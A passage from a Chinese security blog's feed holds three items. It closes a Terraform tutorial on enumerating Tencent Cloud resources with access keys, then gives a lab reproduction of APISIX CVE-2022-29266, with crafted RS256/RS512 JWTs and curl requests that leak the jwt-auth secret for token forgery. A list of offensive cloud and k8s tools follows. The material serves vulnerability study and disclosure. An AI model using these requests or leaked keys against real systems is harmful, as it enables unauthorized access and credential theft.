class="language-json">output <span class="token string">"tencent_cloud_cos_bucket_list"</span> <span class="token punctuation">&#123;</span>  value = data.tencentcloud_cos_buckets.cos_buckets.bucket_list<span class="token punctuation">&#125;</span>output <span class="token string">"tencent_cloud_cvm_instances_list"</span> <span class="token punctuation">&#123;</span>  value = data.tencentcloud_instances.cvm_instances.instance_list<span class="token punctuation">&#125;</span>output <span class="token string">"tencent_cloud_cam_users_list"</span> <span class="token punctuation">&#123;</span>  value = data.tencentcloud_cam_users.cam_users.user_list<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将 main.tf 改为以下内容</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">provider <span class="token string">"tencentcloud"</span> <span class="token punctuation">&#123;</span>  secret_id  = var.tencentcloud_secret_id  secret_key = var.tencentcloud_secret_key  region     = <span class="token string">"ap-beijing"</span><span class="token punctuation">&#125;</span>data <span class="token string">"tencentcloud_cos_buckets"</span> <span class="token string">"cos_buckets"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>data <span class="token string">"tencentcloud_instances"</span> <span class="token string">"cvm_instances"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>data <span class="token string">"tencentcloud_cam_users"</span> <span class="token string">"cam_users"</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后应用代码，就可以获取到 COS、CVM、CAM 的相关信息了，如果想获取其他的信息，可以在 Provider 腾讯云官方文档中找到。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202205301710723.png"></p><p>从站在安全人员的角度来说，我们完全可以通过 Terraform 打造一个独属于自己的全云场景覆盖的 AK、SK 利用工具，而且我们不用自己调取、调试任何 SDK，可以说是潜力无限了。</p><blockquote><p>通过 Terraform 进行信息收集的这个想法来自 tanger 师傅</p></blockquote><h2 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h2><p>Terraform 的内容远远不止上面说的这些，官方文档对它的介绍也足够详细，同时现在也有了由第三方翻译的中文文档：<a href="https://lonegunmanb.github.io/introduction-terraform/">lonegunmanb.github.io/introduction-terraform</a></p><p>另外在 T Wiki 中，还有一些 Terraform 其他资料，比如 Terraform 可视化、代码安全检查的方法等等，也可以作为扩展阅读：<a href="https://wiki.teamssix.com/CloudNative/Terraform/">wiki.teamssix.com/CloudNative/Terraform</a></p><p>如果你在编写 Terraform 代码的时候，想找一些其他人写的代码进行参考，那么不妨看看 TerraformGoat 这个项目：<a href="https://github.com/HuoCorp/TerraformGoat">github.com/HuoCorp/TerraformGoat</a></p><p>最后建议自己在编写 Terraform 代码的时候，多看官方文档，多用英文去搜索，多用官方文档的代码，可以在很大程度上提高自己的效率。</p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Terraform 是一种资源编排工具，通过它可以很方便的去构建云服务资源，本文将以「在腾讯云上创建</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="Terraform" scheme="https://www.teamssix.com/tags/Terraform/"/>
    
  </entry>
  
  <entry>
    <title>APISIX CVE-2022-29266 漏洞分析与复现</title>
    <link href="https://www.teamssix.com/220430-155921.html"/>
    <id>https://www.teamssix.com/220430-155921.html</id>
    <published>2022-04-30T07:59:21.000Z</published>
    <updated>2022-04-30T08:06:09.594Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2022-29266 这个漏洞已经出现有些时间了，正好现在有时间，网上也出现了不少分析文章，今天来看看这个漏洞。</p><p>在 2.13.1 之前的 Apache APISIX 中，由于 APISIX 中的 jwt-auth 插件依赖于 lua-resty-jwt 库，而在 lua-resty-jwt 库返回的错误信息中可能会包含 JWT 的 sceret 值，因此对于开启了 jwt-auth 插件的 APISIX 存在 JWT sceret 的泄露，从而造成对 JWT 的伪造风险。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>低于 2.13.1 的 Apache APISIX 全部版本。</p><h2 id="前要介绍"><a href="#前要介绍" class="headerlink" title="前要介绍"></a>前要介绍</h2><h3 id="APISIX"><a href="#APISIX" class="headerlink" title="APISIX"></a>APISIX</h3><p>Apache APISIX 是一个由 Apache 基金会孵化的一个开源的云原生 API 网关，具有高性能、可扩展的特点，与传统的 API 网关相比，APISIX 是通过插件的形式来提供负载均衡、日志记录、身份鉴权、流量控制等功能。</p><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JSON Web Token 缩写成 JWT，常被用于和服务器的认证场景中，这一点有点类似于 Cookie 里的 Session id</p><p>JWT 支持 HS256、RS256、RS512 等等算法，JWT 由三部分构成，分别为 Header（头部）、Payload（负载）、Signature（签名），三者以小数点分割。</p><p>JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用，如果知道了 Signature 内容，那么就可以伪造 JWT 了。</p><p>JWT 的格式类似于这样：</p><pre class="line-numbers language-none"><code class="language-none">Header.Payload.Signature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>实际遇到的 JWT 一般是这种样子</p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先根据官方仓库的漏洞修复代码定位到 /apisix/plugins/jwt-auth.lua 文件的第 364 行，如果 JWT 无效则在 return 返回 401 并给出无效的原因，即 jwt_obj.reason</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301602823.png"></p><p>接着在 lua-resty-jwt 库中找到 lib/resty/jwt.lua 文件，在 jwt.lua 文件的 782 行中，可以看到有个 jwt_obj.reason 中包含了 secret，这里代码的意思是说，如果程序执行正常就返回 secret 的值，否则就返回具体的异常信息。</p><blockquote><p>.. 表示字符串拼接，即把后面代码的值拼接到字符串中</p><p>err and err or secret 所表示的意思是：如果 err 为 nil，则返回 secret 的值，否则返回 err</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301602863.png"></p><p>那么接下来要做的就是怎么样构建 payload 才能让代码进入到第 782 行，从而让 jwt_obj.reason 返回我们想要的 secret 呢？那么就要看看 782 行上面的代码。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301604158.png"></p><p>通过上图可以看到，如果想执行到第 782 行，需要满足四个条件，分别如下：</p><ul><li>756 行，JWT 的算法需要是 RS256 或者 RS512</li><li>758 行，trusted_certs_file 值需要为 nil</li><li>774 行，secret 值不能为 nil</li><li>781 行，cert 的值需要为 nil 或者 false</li></ul><blockquote><p>~= 表示不等于</p></blockquote><p>首先，第一个条件，JWT 的算法需要是 RS256 或者 RS512，这个很简单，只需要 JWT 的 header 部分的 alg 参数为 RS256 或者 RS512 即可。</p><p>接着，第二个条件，trusted_certs_file 即信任证书文件，APISIX 默认算法是 HS256，而 HS256 和 HS512 不支持这种证书文件的方式，因此只要我们使用 HS256  或者 HS512 算法就行了。</p><p>然后，第三个条件，secret 值不能为 nil，当 APISIX 使用 jwt-auth 插件的时候，如果使用的默认算法，就需要指定 secret 的值，那么这个 secret 的值就不会是 nil 了。</p><p>最后，第四个条件，cert 的值需要为 nil 或者 false，在 776 行至 779 行的代码中，可以看到会判断 secret 中有没有 CERTIFICATE 和 PUBLIC KEY，如果有那么 cert 就不会是 nil 了，那么也就是说，只要 secret 中没有 CERTIFICATE 和 PUBLIC KEY，代码就会执行到第 782 行，并且返回 secret 的值。</p><p>所以分析到这里就基本清楚了，漏洞利用的前提有以下三个：</p><ul><li>APISIX 需要开启 jwt-auth 插件</li><li>jwt-auth 插件算法需要是 HS256 或者 HS512</li><li>secret 的值中不能包含 CERTIFICATE 和 PUBLIC KEY 字符串</li></ul><p>如果满足了这三个前提，当我们利用 RS256 或者 RS512 的 JWT 值发送给 APISIX 的时候，我们就会得到 jwt-auth 中的 secret，从而实现 JWT 伪造了。</p><p>那么下面就开始搭环境，复现，顺便验证下漏洞分析的正确性。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>在 VulnHub 上有 APISIX CVE-2020-13945 漏洞的靶场，APISIX 版本为 2.11.0，因此我们可以直接用这个靶场作为 CVE-2022-29266 的靶场进行复现。</p><p>环境搭建命令：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> vulhub/apisix/CVE-2020-13945docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>访问 <a href="http://your-ip:9080/">http://your-ip:9080</a> 地址即可</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先需要一个 RS256 算法的 JWT 值，这里为了方便直接在 <a href="https://jwt.io/">jwt.io</a> 中生成，只需要将算法改为 RS256，Payload 改为以下内容即可，注意 Payload 中的 key 值需要和下面创建 consumer 对象时的 key 一致。</p><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;key&quot;: &quot;rs-key&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301603474.png"></p><p>生成的 JWT 值如下：</p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着创建一个 consumer 对象，并设置 jwt-auth 的值，默认是 HS256 算法，secret  值为 teamssix-secret-key</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/consumers -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'&#123;"username": "jack","plugins": &#123;"jwt-auth": &#123;"key": "rs-key","secret": "teamssix-secret-key"&#125;&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再创建 Route 对象，并开启 jwt-auth 插件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/routes/1 -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'&#123;"methods": ["GET"],"uri": "/index.html","plugins": &#123;"jwt-auth": &#123;&#125;&#125;,"upstream": &#123;"type": "roundrobin","nodes": &#123;"0.0.0.0:80": 1&#125;&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时其实漏洞环境才算搭好，接下来就可以开始发送 Payload 了。</p><p>将刚才由 RS256 算法生成的 JWT 值发送给 HS256 算法验证的路由，这样就可以获得刚才设置的 secret 值了。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/index.html?jwt<span class="token operator">=</span>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301603498.png"></p><p>当我们拿到这个 sceret 值后，就可以伪造 JWT Token 了。</p><p>那么根据上面的漏洞分析，这里如果使用 RS512 算法应该也能触发这个漏洞，在 jwt.io 上生成 RS512 的 JWT 值如下：</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301603300.png"></p><pre class="line-numbers language-none"><code class="language-none">eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 curl 访问</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/index.html?jwt<span class="token operator">=</span>eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301603793.png"></p><p>果然使用 RS512 算法同样可以触发，说明漏洞分析的没毛病。</p><p>接着看看如果 secret 中包含了 CERTIFICATE 和 PUBLIC KEY 字符串，会返回什么。</p><p>重新开一个环境后，创建一个 consumer 对象，这次 secret 设置为 teamssix-CERTIFICATE</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/consumers -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'&#123;"username": "jack","plugins": &#123;"jwt-auth": &#123;"key": "rs-key","secret": "teamssix-CERTIFICATE"&#125;&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建 Route 对象，并开启 jwt-auth 插件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/apisix/admin/routes/1 -H <span class="token string">'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1'</span> -X PUT -d <span class="token string">'&#123;"methods": ["GET"],"uri": "/index.html","plugins": &#123;"jwt-auth": &#123;&#125;&#125;,"upstream": &#123;"type": "roundrobin","nodes": &#123;"0.0.0.0:80": 1&#125;&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>触发漏洞</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://127.0.0.1:9080/index.html?jwt<span class="token operator">=</span>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlXPb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FGGmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFklxrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301604593.png"></p><p>可以看到，这里并没有返回刚才设置的 secret 值，而是返回了 not enough data，即 err 的信息，这表明此时 cert 的值已经不为 nil 了，再次证明了上面的分析。</p><h2 id="漏洞代码修复"><a href="#漏洞代码修复" class="headerlink" title="漏洞代码修复"></a>漏洞代码修复</h2><p>观察 APISIX 的漏洞修复信息，可以看到对 jwt-auth.lua 文件的第 364 和 395 行进行了修改，修复信息地址：<a href="https://github.com/apache/apisix/commit/61a48a2524a86f2fada90e8196e147538842db89">https://github.com/apache/apisix/commit/61a48a2524a86f2fada90e8196e147538842db89</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204301602900.png"></p><p>这里是将原来的直接返回报错原因改成了返回 JWT token invalid 和 JWT token verify failed 的文本信息。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><ul><li>升级至 Apache APISIX 2.13.1 及以上版本</li><li>安装补丁包，补丁包地址详见：<a href="https://apisix.apache.org/zh/blog/2022/04/20/cve-2022-29266">https://apisix.apache.org/zh/blog/2022/04/20/cve-2022-29266</a></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞最终造成的风险是 JWT 伪造，但前提是需要对方的 APISIX 开启了 jwt-auth 插件才行，并且如果有细心的读者可能会发现，当我们构造 RS256 算法的 JWT 时，需要先知道目标 APISIX consumer 对象的 key 值，因此这个漏洞利用起来还是有一定限制的。</p><p>这篇文章也已经同步到了 T Wiki 云安全知识文库中，文库地址：<a href="https://wiki.teamssix.com/">wiki.teamssix.com</a>，文库中都是云安全相关的文章，并且有很多来自大家共同贡献的云安全资源，也非常欢迎你一起来补充 T Wiki 云安全知识文库。</p><blockquote><p>由于笔者个人的技术水平有限，因此如果文章中有什么不正确的地方，欢迎在留言处指正，不胜感激。</p></blockquote><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p><p>参考链接：</p><p><a href="https://t.zsxq.com/mqnAeeY">https://t.zsxq.com/mqnAeeY</a></p><p><a href="https://www.jianshu.com/p/1b2c56687d0d">https://www.jianshu.com/p/1b2c56687d0d</a></p><p><a href="https://teamssix.com/211214-175948.html">https://teamssix.com/211214-175948.html</a></p><p><a href="https://apisix.apache.org/blog/2022/04/20/cve-2022-29266">https://apisix.apache.org/blog/2022/04/20/cve-2022-29266</a></p><p><a href="https://zone.huoxian.cn/d/1130-apache-apisix-jwt-cve-2022-29266">https://zone.huoxian.cn/d/1130-apache-apisix-jwt-cve-2022-29266</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;CVE-2022-29266 这个漏洞已经出现有些时间了，正好现在有时间，网上也出现了不少分析文章，今天来看看这个漏洞。&lt;/</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="云原生" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="漏洞复现" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="漏洞分析" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="APISIX" scheme="https://www.teamssix.com/tags/APISIX/"/>
    
  </entry>
  
  <entry>
    <title>T Wiki 云安全知识库本月更新汇总</title>
    <link href="https://www.teamssix.com/220430-111257.html"/>
    <id>https://www.teamssix.com/220430-111257.html</id>
    <published>2022-04-30T03:12:57.000Z</published>
    <updated>2022-04-29T03:42:13.265Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>T Wiki 自 4 月 16 日上线以来，收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更新的内容，如果你还不知道 T Wiki 是什么，可以查看这篇文章<a href="https://teamssix.com/220415-210629.html">T Wiki 云安全知识文库上线</a>，或者访问 T Wiki 地址： <a href="https://wiki.teamssix.com/">wiki.teamssix.com</a></p><h2 id="Listen-to-me，Thank-you"><a href="#Listen-to-me，Thank-you" class="headerlink" title="Listen to me，Thank you"></a>Listen to me，Thank you</h2><p>自 4 月 16 日至 4 月 30 日，总共收到了 7 位师傅的补充，分别为 1derian、ShangRui-hash、半人间丶、UzJu、Idle Life、zhengjim、zxynull</p><p><a href="https://wiki.teamssix.com" target="_blank"><img width="700" src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204291134305.png"></a></p><p>补充内容如下：</p><p><strong>1derian &amp; ShangRui-hash</strong></p><ul><li>AWS 云平台 AccessKey 泄漏利用工具 awsKeyTools</li></ul><p><strong>半人间丶</strong></p><ul><li>在线多云管理平台 行云管家</li><li>阿里云官方 OSS 浏览工具</li><li>云存储管理客户端 qiniuClient</li><li>阿里云 AccessKey 利用工具 aliyun-accesskey-Tools</li><li>阿里云 ECS、策略组辅助小工具 alicloud-tools</li><li>阿里云 AccessKey 泄漏利用工具 AliyunAccessKeyTools</li></ul><p><strong>UzJu</strong></p><ul><li>k8s 集群风险权限扫描工具 KubiScan</li><li>K8s 靶场部署工具 Kubernetes Goat</li></ul><p><strong>Idle Life</strong></p><ul><li>k8s 渗透测试工具 Peirates</li><li>容器渗透测试工具 BOtB</li></ul><p><strong>zhengjim</strong></p><ul><li>CIS 基准检测手册</li><li>CIS 基准检测工具 kube bench</li><li>k8s 集群安全漏洞发现工具 kube hunter</li><li>k8s 安全审计工具 kubestriker</li><li>基于 kubectl 的红队 k8s 安全评估工具 red kube</li><li>容器利用工具 CCAT</li></ul><p><strong>zxynull</strong></p><ul><li>Container Security Checklist</li><li>Docker 核心技术与实现原理</li><li>浅谈 Linux Cgroup机制</li><li>使用 eBPF 逃逸容器技术分析与实践</li><li>内核态eBPF程序实现容器逃逸与隐藏账号 rootkit</li><li>基于 eBPF 实现容器运行时安全</li><li>Linux云计算网络</li><li>腾讯玄武实验室</li><li>云原生技术社区</li><li>进击云原生</li><li>一个支持在线分析容器镜像的网站 contains</li><li>可以检测镜像、文件系统、git存储库的漏洞以及配置问题的镜像扫描工具 trivy</li><li>容器镜像漏洞静态扫描工具 Clair</li><li>用于深度分析docker镜像，扫描容器镜像和文件系统中的漏洞的工具 Anchore</li><li>用于对 docker 镜像和容器中的木马、恶意软件、病毒等已知漏洞进行静态分析工具 Dagda</li><li>一种运行时安全工具，用于检测在 Kubernetes 上运行的主机和容器中的异常活动 Falco</li><li>带有多个自动化测试的脚本，用于检查在生产环境中部署容器的最佳实践 Docker_Bench_Security</li><li>原生支持云云原生通用性系统可见性工具 sysdig</li><li>容器镜像分析工具 DIVE</li></ul><p>共计 36 条补充更新，再次感谢各位师傅。</p><h2 id="Awesome-Cloud-Security"><a href="#Awesome-Cloud-Security" class="headerlink" title="Awesome Cloud Security"></a>Awesome Cloud Security</h2><p>Awesome Cloud Security 项目是一个云安全资源汇总的项目，这个项目内容会和 T Wiki 云安全资源板块同步更新，Awesome Cloud Security 项目地址：<a href="https://github.com/teamssix/awesome-cloud-security">github.com/teamssix/awesome-cloud-security</a></p><p>欢迎大家一起来贡献 Awesome Cloud Security 项目，一旦收到师傅们的补充贡献，Awesome Cloud Security 项目和 T Wiki 中就会出现师傅你的 ID 和头像。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204291134859.png"></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204291134900.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>创建 T Wiki 和 Awesome Cloud Security 项目的起因都是因为笔者在学习云安全的过程中，发现国内这块资源属实不多，于是便想着把自己学习过程中所收集到的一些资源以及自己的笔记公开出来，希望帮助到有需要的人。</p><p><strong>“知识思想交换时出现的情况是 1+1&gt;4。不同的思想进行交换的时候，交换双方不仅保留了自己的思想，获得了对方的思想，而且在交流中还碰撞出火花，创造出全新的思想。”</strong> —— 摘自由李录著作的《文明、现代化、价值投资与中国》</p><p>我们一起补充，知识共享、互相学习，这样国内云安全资源的获取门槛就会越来越低，我们每个人会发展越来越好，国内的云安全发展也会越来越好。</p><blockquote><p> 更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202204152148071.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;T Wiki 自 4 月 16 日上线以来，收到不少师傅的支持与反馈，此时正好到月末，特此整理下这段时间来 T Wiki 上所更新的内容，如</summary>
      
    
    
    
    <category term="云安全" scheme="https://www.teamssix.com/categories/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="云安全" scheme="https://www.teamssix.com/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="知识文库" scheme="https://www.teamssix.com/tags/%E7%9F%A5%E8%AF%86%E6%96%87%E5%BA%93/"/>
    
    <category term="更新汇总" scheme="https://www.teamssix.com/tags/%E6%9B%B4%E6%96%B0%E6%B1%87%E6%80%BB/"/>
    
  </entry>
  
  <entry>
    <title>TWiki 云安全知识文库上线</title>
    <link href="https://www.teamssix.com/220415-210629.html"/>
    <id>https://www.teamssix.com/220415-210629.html</id>
    <published>2022-04-15T13:06:29.000Z</published>
    <updated>2022-04-15T14:12:09.525Z</updated>
    
